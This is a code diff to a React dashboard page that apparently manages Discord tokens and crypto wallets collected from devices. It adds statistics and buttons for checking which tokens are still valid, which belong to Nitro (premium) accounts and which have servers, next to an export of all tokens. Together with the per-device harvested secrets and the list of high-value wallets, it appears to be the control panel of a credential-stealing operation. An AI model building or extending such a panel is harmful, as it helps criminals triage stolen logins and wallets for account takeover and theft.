@@ -52,6 +52,18 @@ interface GlobalStats {
   }
 }
 
+interface DiscordValidationStats {
+  total_tokens: number
+  validated_tokens: number
+  valid_tokens: number
+  invalid_tokens: number
+  unvalidated_tokens: number
+  nitro_tokens: number
+  tokens_with_servers: number
+  validation_rate: number
+  valid_rate: number
+}
+
 interface DiscordToken {
   token: string
   token_type: string
@@ -100,12 +112,19 @@ export default function MessagingWalletsPage() {
 function MessagingWalletsContent() {
   const [globalStats, setGlobalStats] = useState<GlobalStats | null>(null)
   const [highValueWallets, setHighValueWallets] = useState<CryptoWallet[]>([])
+  const [validationStats, setValidationStats] = useState<DiscordValidationStats | null>(null)
   const [isLoading, setIsLoading] = useState(true)
   const [showSecrets, setShowSecrets] = useState<Record<string, boolean>>({})
+  const [isValidating, setIsValidating] = useState(false)
+  const [validationProgress, setValidationProgress] = useState<{
+    current: number
+    total: number
+  } | null>(null)
 
   useEffect(() => {
     fetchGlobalStats()
     fetchHighValueWallets()
+    fetchValidationStats()
   }, [])
 
   const fetchGlobalStats = async () => {
@@ -135,6 +154,24 @@ function MessagingWalletsContent() {
     }
   }
 
+  const fetchValidationStats = async () => {
+    try {
+      const response = await fetch("/api/v1/messaging/discord/validation-stats")
+      if (response.ok) {
+        const data = await response.json()
+        if (data.success && data.stats) {
+          setValidationStats({
+            ...data.stats,
+            validation_rate: data.percentages.validation_rate,
+            valid_rate: data.percentages.valid_rate,
+          })
+        }
+      }
+    } catch (error) {
+      console.error("Error fetching validation stats:", error)
+    }
+  }
+
   const copyToClipboard = (text: string, label: string) => {
     navigator.clipboard.writeText(text)
     toast.success(`${label} copied to clipboard`)
@@ -146,6 +183,19 @@ function MessagingWalletsContent() {
 
   const maskSecret = (secret: string) => {
     return "*".repeat(secret.length)
+  }
+
+  const validateAllTokens = async () => {
+    setIsValidating(true)
+    try {
+      toast.info("Validation feature available - select a device to validate its tokens")
+      // TODO: Implement global validation or device selection
+      // For now, this would require fetching all devices and validating each
+    } catch (error) {
+      toast.error("Validation failed")
+    } finally {
+      setIsValidating(false)
+    }
   }
 
   if (isLoading || !globalStats) {
@@ -190,7 +240,9 @@ function MessagingWalletsContent() {
               <CardContent>
                 <div className="text-2xl font-bold">{globalStats.counts.discord_tokens}</div>
                 <p className="text-xs text-muted-foreground mt-1">
-                  {Object.entries(globalStats.breakdown.discord_by_type).length} types detected
+                  {validationStats && validationStats.validated_tokens > 0
+                    ? `${validationStats.valid_tokens} valid, ${validationStats.invalid_tokens} invalid`
+                    : `${Object.entries(globalStats.breakdown.discord_by_type).length} types detected`}
                 </p>
               </CardContent>
             </Card>
@@ -232,6 +284,125 @@ function MessagingWalletsContent() {
               </CardContent>
             </Card>
           </div>
+
+          {/* Discord Validation Section */}
+          {validationStats && validationStats.total_tokens > 0 && (
+            <Card>
+              <CardHeader>
+                <div className="flex items-center justify-between">
+                  <div>
+                    <CardTitle>Discord Token Validation</CardTitle>
+                    <CardDescription>
+                      Validation status and quality metrics for Discord tokens
+                    </CardDescription>
+                  </div>
+                  {validationStats.unvalidated_tokens > 0 && (
+                    <Button
+                      variant="outline"
+                      size="sm"
+                      onClick={validateAllTokens}
+                      disabled={isValidating}
+                    >
+                      {isValidating ? (
+                        <>
+                          <div className="animate-spin mr-2 h-4 w-4 border-2 border-primary border-t-transparent rounded-full" />
+                          Validating...
+                        </>
+                      ) : (
+                        <>
+                          <CheckCircle className="h-4 w-4 mr-2" />
+                          Validate {validationStats.unvalidated_tokens} Tokens
+                        </>
+                      )}
+                    </Button>
+                  )}
+                </div>
+              </CardHeader>
+              <CardContent>
+                <div className="grid gap-4 md:grid-cols-3 mb-6">
+                  <div className="flex flex-col gap-2">
+                    <div className="flex items-center justify-between">
+                      <span className="text-sm font-medium">Validation Rate</span>
+                      <Badge variant="outline">{validationStats.validation_rate}%</Badge>
+                    </div>
+                    <div className="h-2 bg-secondary rounded-full overflow-hidden">
+                      <div
+                        className="h-full bg-blue-500 transition-all"
+                        style={{ width: `${validationStats.validation_rate}%` }}
+                      />
+                    </div>
+                    <span className="text-xs text-muted-foreground">
+                      {validationStats.validated_tokens} of {validationStats.total_tokens} validated
+                    </span>
+                  </div>
+
+                  <div className="flex flex-col gap-2">
+                    <div className="flex items-center justify-between">
+                      <span className="text-sm font-medium">Valid Rate</span>
+                      <Badge variant="outline" className="bg-green-500/10 text-green-600">
+                        {validationStats.valid_rate}%
+                      </Badge>
+                    </div>
+                    <div className="h-2 bg-secondary rounded-full overflow-hidden">
+                      <div
+                        className="h-full bg-green-500 transition-all"
+                        style={{ width: `${validationStats.valid_rate}%` }}
+                      />
+                    </div>
+                    <span className="text-xs text-muted-foreground">
+                      {validationStats.valid_tokens} valid tokens
+                    </span>
+                  </div>
+
+                  <div className="flex flex-col gap-2">
+                    <div className="flex items-center justify-between">
+                      <span className="text-sm font-medium">Premium Accounts</span>
+                      <Badge variant="outline" className="bg-purple-500/10 text-purple-600">
+                        {validationStats.nitro_tokens}
+                      </Badge>
+                    </div>
+                    <span className="text-xs text-muted-foreground mt-2">
+                      {validationStats.tokens_with_servers} with servers
+                    </span>
+                  </div>
+                </div>
+
+                <div className="grid gap-3 md:grid-cols-4">
+                  <div className="flex items-center gap-3 p-3 border rounded-lg">
+                    <CheckCircle className="h-5 w-5 text-green-500" />
+                    <div>
+                      <div className="text-2xl font-bold">{validationStats.valid_tokens}</div>
+                      <div className="text-xs text-muted-foreground">Valid</div>
+                    </div>
+                  </div>
+
+                  <div className="flex items-center gap-3 p-3 border rounded-lg">
+                    <XCircle className="h-5 w-5 text-red-500" />
+                    <div>
+                      <div className="text-2xl font-bold">{validationStats.invalid_tokens}</div>
+                      <div className="text-xs text-muted-foreground">Invalid</div>
+                    </div>
+                  </div>
+
+                  <div className="flex items-center gap-3 p-3 border rounded-lg">
+                    <AlertCircle className="h-5 w-5 text-yellow-500" />
+                    <div>
+                      <div className="text-2xl font-bold">{validationStats.unvalidated_tokens}</div>
+                      <div className="text-xs text-muted-foreground">Unvalidated</div>
+                    </div>
+                  </div>
+
+                  <div className="flex items-center gap-3 p-3 border rounded-lg">
+                    <TrendingUp className="h-5 w-5 text-purple-500" />
+                    <div>
+                      <div className="text-2xl font-bold">{validationStats.nitro_tokens}</div>
+                      <div className="text-xs text-muted-foreground">Nitro</div>
+                    </div>
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
+          )}
 
           {/* Breakdown Charts */}
           <div className="grid gap-4 md:grid-cols-2">
@@ -407,10 +578,29 @@ function MessagingWalletsContent() {
           <Card>
             <CardHeader>
               <CardTitle>Quick Actions</CardTitle>
-              <CardDescription>Export and manage your data</CardDescription>
+              <CardDescription>Validate tokens and export your data</CardDescription>
             </CardHeader>
             <CardContent>
               <div className="flex flex-wrap gap-3">
+                {validationStats && validationStats.unvalidated_tokens > 0 && (
+                  <Button
+                    variant="default"
+                    onClick={validateAllTokens}
+                    disabled={isValidating}
+                  >
+                    {isValidating ? (
+                      <>
+                        <div className="animate-spin mr-2 h-4 w-4 border-2 border-white border-t-transparent rounded-full" />
+                        Validating...
+                      </>
+                    ) : (
+                      <>
+                        <CheckCircle className="h-4 w-4 mr-2" />
+                        Validate Discord Tokens
+                      </>
+                    )}
+                  </Button>
+                )}
                 <Button variant="outline">
                   <Download className="h-4 w-4 mr-2" />
                   Export All Discord Tokens
